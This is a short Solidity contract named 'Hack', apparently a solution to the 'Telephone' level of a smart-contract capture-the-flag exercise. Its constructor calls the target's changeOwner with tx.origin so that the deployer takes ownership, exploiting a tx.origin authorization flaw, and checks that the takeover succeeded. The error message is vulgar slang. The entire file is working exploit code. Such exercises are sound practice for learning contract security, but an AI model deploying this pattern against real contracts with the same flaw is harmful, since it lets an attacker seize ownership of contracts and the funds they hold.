// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './Telephone.sol';
contract Hack
{
    constructor(Telephone i)
    {
        i.changeOwner(tx.origin);
        require(i.owner() == tx.origin,"fail hogya mc");
    } 
}